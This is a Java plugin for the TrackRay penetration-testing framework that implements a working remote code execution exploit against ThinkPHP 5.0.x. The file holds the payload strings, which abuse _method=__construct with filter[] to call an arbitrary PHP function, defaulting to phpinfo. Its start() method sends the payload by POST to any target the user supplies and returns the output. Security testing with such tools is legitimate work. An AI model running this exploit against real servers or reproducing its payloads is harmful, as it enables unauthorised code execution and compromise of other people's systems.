package com.trackray.module.plugin.webapp.thinkphp;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.base.utils.StrUtils;

import java.util.Map;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/1/12 10:37
 */
@Rule( type = AbstractPlugin.Type.HTML ,
        params = {
                @Param(key = "target", desc = "目标地址"),
                @Param(key = "func",defaultValue = "phpinfo" , desc = "执行函数"),
                @Param(key = "var",defaultValue = "1" , desc = "函数参数"),
        })
@Plugin(title = "Thinkphp 5.0.23-RCE" ,
        desc = "(2019-01-12) code 不写默认执行phpinfo" ,
        author = "浅蓝" ,
        link = {"https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce",
                "https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&mid=2247483692&idx=1&sn=af58e424cb1df6d13d73e73e66d175d0&chksm=fc474bfbcb30c2ede9defa57dfb6d0237f19811e7863c822a1fe6e30ee5e26a51729228cbd1d",
                "https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003",
                "https://mp.weixin.qq.com/s/6lL9FCQNAVrR785ktTnIng"})
public class Thinkphp5xRCE2 extends CommonPlugin<String> {
    public static String url_1 = "/index.php?s=captcha";
    public static String payload_5_0_23 = "_method=__construct&filter[]={func}&method=get&server[REQUEST_METHOD]={var}";

    public static String url_2 = "?s=index/index/index";
    public static String payload_5_0_10 = "s={var}&_mehthod=__construct&method=&filter[]={func}";

    private String func;
    private String target;
    private String var;
    @Override
    public boolean check(Map<String, Object> param) {
        target = param.get(currentParams()[0].key()).toString();
        func = param.get(currentParams()[1].key()).toString();
        var = param.get(currentParams()[2].key()).toString();

        crawlerPage.getRequest().setUrl(target.concat(url_1));
        fetcher.run(crawlerPage);
        int code = crawlerPage.getResponse().getStatus().getStatusCode();
        if (code == 404 || code == 302 || code == 301)
            return false;
        return true;
    }

    @Override
    public String start() {
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        Map<String, String> map = StrUtils.paramToMap((payload_5_0_23.replace("{func}", func).replace("{var}", var)));
        crawlerPage.getRequest().setParamMap(map);
        fetcher.run(crawlerPage);
        return crawlerPage.getResponse().getStatus().getContentString();
    }
}
